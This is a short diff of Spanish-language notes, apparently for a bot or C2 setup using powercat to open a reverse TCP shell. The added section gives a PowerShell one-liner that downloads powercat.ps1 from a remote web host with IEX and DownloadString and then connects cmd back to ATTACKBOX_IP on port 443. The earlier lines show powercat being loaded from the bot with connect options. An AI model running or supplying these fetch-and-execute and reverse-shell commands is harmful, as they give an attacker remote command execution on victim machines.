@@ -6,3 +6,7 @@ Conexion Reversa TCP entrega d remote Shell
 - User config
 	* Cargar .\powercat (segun politica podria ser "Import-Module .\powercat.ps1")
 	* Desde el bot : load|powercat|-c <ipServer> -p <pertoServer> -ep
+
+
+## Download and execute from remote powercat
+- powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[WEB-IP]:[PORT]/powercat.ps1');powercat -c ATTACKBOX_IP -p 443 -e cmd"
